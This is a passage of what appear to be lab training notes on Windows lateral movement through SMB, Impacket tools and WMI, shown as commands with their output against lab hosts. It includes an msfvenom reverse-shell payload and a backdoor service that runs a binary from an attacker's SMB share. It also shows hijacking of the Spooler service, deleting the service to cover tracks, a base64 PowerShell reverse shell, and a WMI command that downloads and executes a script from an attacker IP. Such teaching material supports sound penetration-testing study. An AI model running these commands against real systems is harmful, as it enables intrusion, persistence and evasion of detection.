PS C:\Tools> reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters
    AllowInsecureGuestAuth    REG_DWORD    0x0
```

The above registry key is responsible for allowing guest access in SMB2 and SMB3 which is disabled by default on Windows. If you have an account with administrative rights, you can use the following command to allow insecure guest authentication:

```powershell
PS C:\Tools> reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
The operation completed successfully.
```

#### Lateral Movement from Linux

To achieve lateral movement from Linux you can use the Impacket tool set. Impacket is a suite of Python libraries designed for interacting with network protocols. It focuses on offering low-level programmatic control over packet manipulation and, for certain protocols like SMB and MSRPC, includes the protocol implementations themselves.

##### [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)

... is a great alternative for Linux users. This method is very similar to the traditional PsExec tool from Sysinternals suite. Psexec.py creates a remote service by uploading an executable with a random name to the `ADMIN$` share on the target Windows machine. It then registers this service via RPC and the Windows Service Control Manager. Once registered, the tool establishes communication through a named pipe, allowing for the execution of commands and retrieval of outputs on the remote system. Understanding this mechanims is crucial for effectively utilizing the tool and appreciating its role in facilitating RCE.

You can use psexec.py to get remote code execution on a target host, administrator login credentials are required. You must provide the domain, admin level user, password, and the target IP as follows `<domain>/<user>:<password>@<ip>`: 

```bash
d41y@htb[/htb]$ proxychains4 -q psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 172.20.0.52.....
[*] Found writable share ADMIN$
[*] Uploading file sRhFLBbo.exe
[*] Opening SVCManager on 172.20.0.52.....
[*] Creating service KQWG on 172.20.0.52.....
[*] Starting service KQWG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5830]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

##### smbexec.py

The [smbexec.py](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) method leverages the built-in Windows SMB functionality to run arbitrary commands on a remote system without uploading files, making it a quieter alternative.

Communication occurs exclusively over TCP port 445. It also sets up a service, using only MSRPC for this, and manages the service through the `svcctl` SMB pipe.

To use this tool, you must provide the domain name, administrator user, password, and the target IP address `<domain>/<user>:<password>@<ip>`:

```bash
d41y@htb[/htb]$ proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

As you can see, you now have established a semi-interactive shell on the host.

##### services.py

The [services.py](https://github.com/fortra/impacket/blob/master/examples/services.py) script in Impacket interacts with Windows services using the MSRPC interface. It allows starting, stopping, deleting, reading status, configuring, listing, creating, and modifying services. During Red Teaming assignments, many tasks can be greatly simplified by gaining access to the target machine's services. This technique is non-interactive, meaning that you won't be able to see the results of the actions in real time.

You can view a list of services in the target host, by typing the command `list` after providing the domain name, the administrator account, the password, and target IP address `<domain>/<user>:<password>@<ip>`:

```bash
d41y@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Listing services available on target
                      1394ohci -                                    1394 OHCI Compliant Host Controller -  STOPPED
                         3ware -                                                                  3ware -  STOPPED
                          ACPI -                                                  Microsoft ACPI Driver -  RUNNING
                       AcpiDev -                                                    ACPI Devices driver -  STOPPED
                        acpiex -                                                Microsoft ACPIEx Driver -  RUNNING
                      acpipagr -                                       ACPI Processor Aggregator Driver -  STOPPED

...SNIP...

          WpnUserService_7a815 -                          Windows Push Notifications User Service_7a815 -  RUNNING
                          KQWG -                                                                   KQWG -  RUNNING
Total Services: 543
```

To move laterally with this tool, you can set up a new service, modify an existing one, and define a custom command to get a reverse shell.

To create a new service, instead of using the option `list` you will use `create` followed by the name of the new service `-name <serviceName>`, a display name `-display "<Service Display Name>"` and finally you specify the command you want to execute with the option `-path "cmd /c <payload>"`.

For your payload, you will use the Metasploit output option `exe-service`, which creates a service binary.

```bash
d41y@htb[/htb]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload                                     
No encoder specified, outputting raw payload   
Payload size: 460 bytes                        
Final size of exe-service file: 48640 bytes    
Saved as: rshell-9001s.exe
```

Now, you can execute the following command to create a new service:

```bash
d41y@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating service Service Backdoor
```

You can view the configuration of the custom command created using `config -name <serviceName>:

```bash
d41y@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying service config for Service Backdoor
TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
START_TYPE        :  2 -  AUTO START
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : \\10.10.14.207\share\rshell-9001.exe
LOAD_ORDER_GROUP  : 
TAG               : 0
DISPLAY_NAME      : Service Backdoor
DEPENDENCIES      : /
SERVICE_START_NAME: LocalSystem
```

Before you run the service, you must ensure that the SMB server has the file that will be executed:

```bash
d41y@htb[/htb]$ sudo smbserver.py share -smb2support ./
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

You must start your Netcat listener:

```bash
d41y@htb[/htb]$ nc -lnvp 9001
Listening on 0.0.0.0 9001
```

You can now start the service with `start -name <serviceName>:

```bash
d41y@htb[/htb]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor' 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Starting service Service Backdoor
```

Looking at your attack host, you have successfully established a reverse shell:

```bash
d41y@htb[/htb]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.207] from (UNKNOWN) [10.129.229.244] 62855
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Finally, you can cover up the traces and delete the service by typing `delete -name <serviceName>`:

```bash
d41y@htb[/htb]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Deleting service Service Backdoor
```

Alternatively, you use `services.py` to modify existing services; for example, if you find a service authenticated as a specific user account, you can change the configuration of that service and make it execute your payload. In the following example, you can modify the Spooler service to execute your payload. First, see the current service configuration:

```bash
d41y@htb[/htb]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name Spooler
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                      
                                               
[*] Querying service config for Spooler
TYPE              : 272 -  SERVICE_WIN32_OWN_PROCESS  SERVICE_INTERACTIVE_PROCESS                                                                                                             
START_TYPE        :  4 -  DISABLED
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : C:\Windows\System32\spoolsv.exe
LOAD_ORDER_GROUP  : SpoolerGroup    
TAG               : 0               
DISPLAY_NAME      : Print Spooler  
DEPENDENCIES      : RPCSS/http/
SERVICE_START_NAME: LocalSystem
```

Next, you will modify the binary path to your payload and set the `START_TYPE` to `AUTO_START` with the option `-start_type 2`_

```bash
d41y@htb[/htb]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Changing service config for Spooler
```

Finally, you can start the service and wait for your command execution:

```bash
d41y@htb[/htb]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Starting service Spooler
```

The advantage of this is that if a service is configured with a specific user account, you can take advantage of that account and impersonate it.

##### [atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)

The `atexec.py` script utilizes the Windows Task Scheduler service, which is accessible through the `atsv` SMB pipe. It enables you to remotely append to the scheduler, which will execute at the designated time.

With this tool, the command output is sent to a file, which is subsequently accessed via the `ADMIN$` share. For this utility to be effective, it's essential to synchronize the clocks on both the attacking and target PCs down to the exact minute.

You can leverage this tool by inserting a revshell on the target host.

Start a listener:

```bash
d41y@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
```

Now pass the domain name, administrator user, password, and target IP address `<domain>/<user>:<password>@<ip>`, and lastly, you can pass your revshell payload to get executed.

```bash
d41y@htb[/htb]$ proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
Impacket v0.11.0 - Copyright 2023 Fortra

[!] This will work ONLY on Windows >= Vista
[*] Creating task \tEQBXeQm
[*] Running task \tEQBXeQm
[*] Deleting task \tEQBXeQm
[*] Attempting to read ADMIN$\Temp\tEQBXeQm.tmp
```

You have successfully established a reverse shell connection in your attack box:

```bash
d41y@htb[/htb]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 50027

PS C:\Windows\system32>
```

### Windows Management Instrumentation

Windows Management Instrumentation (_WMI_) is a powerful Windows feature that provides a standardized way to interact with system management information and manage devices and application in a networked environment. WMI can be used to query system information, configure system settings, and perform administrative tasks on remote machines. It is particularly useful for automation, monitoring, and scripting tasks. WMI communication primarily uses TCP port 135 for the initial connection and dynamically allocated ports in the range 49152-65535 for subsequent data exchange.

#### Rights

To effectively use WMI for lateral movement within a network, it is crucial to have the necessary permissions on the target system. Generally, this means having administrative privileges. However, certain WMI namespaces and operations can be accessed with lower privileges if they are specifically configured to allow it.

By default, only users who are members of the Administrators group can perform remote WMI operations. This is because remote WMI tasks often involve actions that require high-level access, such as querying system information, executing processes, or changing system settings.

#### Enum

Before using WMI for lateral movement, it is essential to determine which systems have WMI enabled and accessible. Enumeration can be performed using various tools and scripts to identify targets. Here, you will use nmap and netexec to identify if the target has WMI ports available.

You can use nmap to scan for open ports on the network to identify systems with WMI services running. Since WMI uses TCP port 135 for the initial connection and dynamic ports in the range 49152-65535 for subsequent communication, a scan targeting these ports can help identify potential targets.

```bash
d41y@htb[/htb]$ nmap -p135,49152-65535 10.129.229.244 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-05 09:03 AST
Nmap scan report for 172.20.0.52
Host is up (0.13s latency).
Not shown: 16378 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
135/tcp   open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49670/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc      Microsoft Windows RPC
49672/tcp open  msrpc      Microsoft Windows RPC
49686/tcp open  msrpc      Microsoft Windows RPC
49731/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

To test credentials against WMI you will use NetExec. Select the protocol `wmi` and the account `Helen` and the password `RedRiot88`.

```bash
d41y@htb[/htb]$ netexec wmi 10.129.229.244 -u helen -p RedRiot88
RPC         10.129.229.244  135    SRV01            [*] Windows 10 / Server 2019 Build 17763 (name:SRV01) (domain:inlanefreight.local)
RPC         10.129.229.244  135    SRV01            [+] inlanefreight.local\helen:RedRiot88
```

By default, only administrators can execute actions using WMI remotely. In the above example, the user `helen` doesn't have rights to execute commands on SRV01 using WMI, because you don't see `(Pwn3d!)`. However, it can still be used to authenticate accounts or verify if credentials are correct. There are rare cases where non-administrator accounts are explicitly configured to use WMI remotely, but this is not the default behavior. Nonetheless, it is worth checking.

You can attempt to execute commands on SRV02. You would need to configure chisel and use proxychains to connect to the target server beforehand:

```bash
d41y@htb[/htb]$ proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88
RPC         172.20.0.52     135    SRV02            [*] Windows 10 / Server 2019 Build 17763 (name:SRV02) (domain:inlanefreight.local)
WMI         172.20.0.52     135    SRV02            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
```

#### Lateral Movement from Windows

On Windows you can use `wmic` and PowerShell to interact with WMI. The WMI command-line is a command-line interface that allows administrators to query and manage various aspects of the Windows OS system programmatically. This is achieved through different namespaces and classes. For example, the `Win32_OperatingSystem` class is used for retrieving OS details, `Win32_Process` for managing processes, `Win32_Service` for handling services, and `Win32_ComputerSystem` for overall system information. These classes provide properties that describe the current state of the system and methods to perform administrative actions.

Connect via RDP to SRV01 using helen's credentials.

```bash
d41y@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
```

To retrieve detailed information about the OS from a remote computer, you can use the following WMIC command:

```powershell
PS C:\Tools> wmic /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
Caption                                 CSDVersion  OSArchitecture  Version
Microsoft Windows Server 2019 Standard              64-bit          10.0.17763
```

You can perform the same action using PowerShell:

```powershell
PS C:\Tools> Get-WmiObject -Class Win32_OperatingSystem -ComputerName 172.20.0.52 | Select-Object Caption, CSDVersion, OSArchitecture, Version

Caption                                CSDVersion OSArchitecture Version
-------                                ---------- -------------- -------
Microsoft Windows Server 2019 Standard            64-bit         10.0.17763
```

In addition to querying information, WMI also allows for executing commands remotely. This capability is particularly useful for administrative tasks such as starting or stopping processes, running scripts, or changing system configurations without direct machine access. In your case, you can use it for lateral movement. Here is an example of using WMIC to create a new process on a remote machine:

```powershell
PS C:\Tools> wmic /node:172.20.0.52 process call create "notepad.exe"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 700;
        ReturnValue = 0;
};
```

In this example, the WMIC command is used to remotely start `notepad.exe` on the computer with IP address `172.20.0.52`. The same task can be accomplished using PowerShell for more flexibility and integration with scripts:

```powershell
PS C:\Tools> Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52
```

Additionally, you can also specify credentials to within `wmic` or PowerShell:

```powershell
PS C:\Tools> wmic /user:username /password:password /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
```

```powershell
PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString "password" -AsPlainText -Force));
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52 -Credential $credential
```

You can try to use the same payload you used with SharpRDP to get a metasploit session using WMI:

```powershell
PS C:\Tools> Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" -ComputerName 172.20.0.52

__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ProcessId        : 8084
ReturnValue      : 0
PSComputerName   :
```

#### Lateral Movement from Linux

Interacting with WMI from a Linux system can be accomplished using various tools and libraries that support the WMI protocol. Below are some commonly used tools for this purpose. `wmic` is a command-line tool that allows you to interact with WMI from Linux. It provides a straightforward way to query and manage Windows systems. To install `wmic` you need to install the `wmi-client` package. On Debian-based systems, you can install it using the following commands:

```bash
d41y@htb[/htb]$ sudo apt-get install wmi-client
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  wmi-client
0 upgraded, 1 newly installed, 0 to remove and 73 not upgraded.
...SNIP...
```

Once installed, you can use `wmic` to run queries against a remote Windows machine. Here's an example of querying the OS details:

```bash
d41y@htb[/htb]$ wmic -U inlanefreight.local/helen%RedRiot88 //172.20.0.52 "SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem"
CLASS: Win32_OperatingSystem
Caption|CSDVersion|OSArchitecture|Version
Microsoft Windows Server 2019 Standard|(null)|64-bit|10.0.17763
```

Additionally, `impacket` includes the built-in script `wmiexec.py` for executing commands using WMI. Keep in mind that `wmiexec.py` uses port 445 to retrieve the output of the command and if port 445 is blocked, it won't work. If you want to omit the output, you can use the options `-silentcommand` or `-nooutput`:

```bash
d41y@htb[/htb]$ wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 whoami
Impacket v0.12.0.dev1+20240523.75507.15eff88 - Copyright 2023 Fortra

[-] [Errno Connection error (172.20.0.52:445)] timed out
```

```bash
d41y@htb[/htb]$ wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 whoami -nooutput
Impacket v0.12.0.dev1+20240523.75507.15eff88 - Copyright 2023 Fortra
```

Alternatively, you can use NetExec to run WMI queries or execute commands using WMI. To perform a query you can use the option `--wmi <QUERY>`:

```bash
d41y@htb[/htb]$ proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 --wmi "SELECT * FROM Win32_OperatingSystem"
RPC         172.20.0.52  135    SRV02            [*] Windows 10 / Server 2019 Build 17763 (name:SRV02) (domain:inlanefreight.local)
WMI         172.20.0.52  135    SRV02            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
WMI         172.20.0.52  135    SRV02            Caption => Microsoft Windows Server 2019 Standard
WMI         172.20.0.52  135    SRV02            Description =>
WMI         172.20.0.52  135    SRV02            Name => Microsoft Windows Server 2019 Standard|C:\Windows|\Device\Harddisk0\Partition4
WMI         172.20.0.52  135    SRV02            Status => OK  
WMI         172.20.0.52  135    SRV02            CSCreationClassName => Win32_ComputerSystem
...SNIP...
```

To execute commands you can use the protocol `wmi` with the option `-x <COMMAND>`. Unlike impacket `wmiexec.py`, netexec can retrieve the output using WMI rather than SMB:

```bash
d41y@htb[/htb]$ proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 -x whoami
RPC         172.20.0.52  135    SRV02            [*] Windows 10 / Server 2019 Build 17763 (name:SRV02) (domain:inlanefreight.local)
WMI         172.20.0.52  135    SRV02            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
WMI         172.20.0.52  135    SRV02            [+] Executed command: "whoami" via wmiexec
WMI         172.20.0.52  135    SRV02            inlanefreight\helen
```

